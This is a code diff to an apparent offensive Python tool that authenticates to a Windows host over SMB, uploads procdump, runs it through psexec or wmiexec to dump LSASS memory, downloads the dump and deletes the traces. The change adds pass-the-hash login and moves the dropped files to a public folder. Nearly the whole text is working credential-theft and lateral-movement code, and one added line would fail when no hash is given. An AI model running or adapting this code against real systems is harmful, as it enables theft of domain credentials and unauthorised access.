@@ -31,7 +31,7 @@ from pypykatz.remote.cmdhelper import RemoteCMDHelper
 
 
 class Dumper:
-    def __init__(self, username, password, domain, target, auth):
+    def __init__(self, username, password, domain, target, auth, hashes):
         self.target = target
         self.auth = auth
         if domain is None:
@@ -40,6 +40,7 @@ class Dumper:
             "username": username,
             "password": password,
             "domain": domain,
+            "hashes": hashes,
         }
         self.smb = SMBConnection(self.target, self.target, sess_port=445, timeout=4)
         self.host_info = self.enum_host_info()
@@ -47,10 +48,16 @@ class Dumper:
     def enum_host_info(self):
         print("Performing enumeration")
         info_dict = {}
+        if self.credentials["hashes"] != "":
+            self.credentials["hashes"] = self.credentials["hashes"].lower()
+        else:
+            self.credentials["hashes"] = None
         self.smb.login(
             user=self.credentials["username"],
             password=self.credentials["password"],
             domain=self.credentials["domain"],
+            nthash=self.credentials["hashes"].split(":")[1],
+            lmhash=self.credentials["hashes"].split(":")[0],
         )
         os = self.smb.getServerOS()
         arch = self.get_arch()
@@ -95,11 +102,15 @@ class Dumper:
         if self.host_info["arch"] == 64:
             src = src_x64
             filename = re.sub(r"\d+", "", path.basename(src))
-            self.smb.putFile("C$", filename, open(src, "rb").read)
+            self.smb.putFile(
+                "C$", "/Users/Public/Documents/" + filename, open(src, "rb").read
+            )
         elif self.host_info["arch"] == 32:
             src = src_x32
             filename = re.sub(r"\d+", "", path.basename(src))
-            self.smb.putFile("C$", filename, open(src, "rb").read)
+            self.smb.putFile(
+                "C$", "/Users/Public/Documents/" + filename, open(src, "rb").read
+            )
         else:
             print("Something went wrong")
             sys.exit(1)
@@ -107,52 +118,21 @@ class Dumper:
 
     def exec_procdump(self):
         print("Executing procdump")
+        if self.credentials["password"] != "":
+            password = self.credentials["password"]
+        else:
+            password = ""
         if self.auth == "psexec":
-            # if self.host_info["arch"] == 64:
-            #     executer = PSEXEC(
-            #         "C:\\procdump.exe -accepteula C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
-            #         None,
-            #         None,
-            #         None,
-            #         int(445),
-            #         self.credentials["username"],
-            #         self.credentials["password"],
-            #         self.credentials["domain"],
-            #         None,
-            #         None,
-            #         False,
-            #         None,
-            #         "",
-            #     )
-            # else:
-            #     executer = PSEXEC(
-            #         "C:\\procdump.exe -accepteula && C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
-            #         None,
-            #         None,
-            #         None,
-            #         int(445),
-            #         self.credentials["username"],
-            #         self.credentials["password"],
-            #         self.credentials["domain"],
-            #         None,
-            #         None,
-            #         False,
-            #         None,
-            #         "",
-            #     )
-            # executer.run(
-            #     remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
-            # )
             executer = PSEXEC(
-                "C:\\procdump.exe -accepteula",
+                "C:\\Users\\Public\\Documents\\procdump.exe -accepteula",
                 None,
                 None,
                 None,
                 int(445),
                 self.credentials["username"],
-                self.credentials["password"],
+                password,
                 self.credentials["domain"],
-                None,
+                self.credentials["hashes"],
                 None,
                 False,
                 None,
@@ -160,15 +140,15 @@ class Dumper:
             ).run(self.target, self.target)
             if self.host_info["arch"] == 64:
                 executer = PSEXEC(
-                    f"C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+                    "C:\\Users\\Public\\Documents\\procdump.exe -ma -64 lsass.exe C:\\Users\\Public\\Documents\\lsass_dump",
                     None,
                     None,
                     None,
                     int(445),
                     self.credentials["username"],
-                    self.credentials["password"],
+                    password,
                     self.credentials["domain"],
-                    None,
+                    self.credentials["hashes"],
                     None,
                     False,
                     None,
@@ -176,15 +156,15 @@ class Dumper:
                 )
             else:
                 executer = PSEXEC(
-                    f"C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
+                    "C:\\Users\\Public\\Documents\\procdump.exe -ma lsass.exe C:\\Users\\Public\\Documents\\lsass_dump",
                     None,
                     None,
                     None,
                     int(445),
                     self.credentials["username"],
-                    self.credentials["password"],
+                    password,
                     self.credentials["domain"],
-                    None,
+                    self.credentials["hashes"],
                     None,
                     False,
                     None,
@@ -192,39 +172,13 @@ class Dumper:
                 )
             executer.run(remoteName=self.target, remoteHost=self.target)
         elif self.auth == "wmiexec":
-            #     if self.host_info["arch"] == 64:
-            #         executer = WMIEXEC(
-            #             command="C:\\procdump.exe -accepteula && C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
-            #             username=self.credentials["username"],
-            #             password=self.credentials["password"],
-            #             domain=self.credentials["domain"],
-            #             hashes=None,
-            #             aesKey=None,
-            #             share="C$",
-            #             noOutput=False,
-            #             doKerberos=False,
-            #             kdcHost=None,
-            #         )
-            #     else:
-            #         executer = WMIEXEC(
-            #             command="C:\\procdump.exe -accepteula && C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
-            #             username=self.credentials["username"],
-            #             password=self.credentials["password"],
-            #             domain=self.credentials["domain"],
-            #             hashes=None,
-            #             aesKey=None,
-            #             share="C$",
-            #             noOutput=False,
-            #             doKerberos=False,
-            #             kdcHost=None,
-            #         )
-            #     executer.run(self.host_info["target"])
+
             executer = WMIEXEC(
-                command="C:\\procdump.exe -accepteula",
+                command="C:\\Users\\Public\\Documents\\procdump.exe -accepteula",
                 username=self.credentials["username"],
-                password=self.credentials["password"],
+                password=password,
                 domain=self.credentials["domain"],
-                hashes=None,
+                hashes=self.credentials["hashes"],
                 aesKey=None,
                 share="C$",
                 noOutput=False,
@@ -233,11 +187,11 @@ class Dumper:
             ).run(self.target)
             if self.host_info["arch"] == 64:
                 executer = WMIEXEC(
-                    command="C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+                    command="C:\\Users\\Public\\Documents\\procdump.exe -ma -64 lsass.exe C:\\Users\\Public\\Documents\\lsass_dump",
                     username=self.credentials["username"],
-                    password=self.credentials["password"],
+                    password=password,
                     domain=self.credentials["domain"],
-                    hashes=None,
+                    hashes=self.credentials["hashes"],
                     aesKey=None,
                     share="C$",
                     noOutput=False,
@@ -246,11 +200,11 @@ class Dumper:
                 )
             else:
                 executer = WMIEXEC(
-                    command="C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+                    command="C:\\Users\\Public\\Documents\\procdump.exe -ma -64 lsass.exe C:\\Users\\Public\\Documents\\lsass_dump",
                     username=self.credentials["username"],
-                    password=self.credentials["password"],
+                    password=password,
                     domain=self.credentials["domain"],
-                    hashes=None,
+                    hashes=self.credentials["hashes"],
                     aesKey=None,
                     share="C$",
                     noOutput=False,
@@ -262,13 +216,17 @@ class Dumper:
 
     def dump_lsass(self):
         print("Dumping")
-        self.smb.getFile("C$", "lsass_dump.dmp", open("lsass_dump.dmp", "wb").write)
+        self.smb.getFile(
+            "C$",
+            "/Users/Public/Documents/lsass_dump.dmp",
+            open("lsass_dump.dmp", "wb").write,
+        )
         print("Done")
 
     def clear_out(self):
         print("Starting ClearOut")
-        self.smb.deleteFile("C$", "lsass_dump.dmp")
-        self.smb.deleteFile("C$", "procdump.exe")
+        self.smb.deleteFile("C$", "/Users/Public/Documents/lsass_dump.dmp")
+        self.smb.deleteFile("C$", "/Users/Public/Documents/procdump.exe")
         self.smb.close()
         print("ClearOut Done")
 
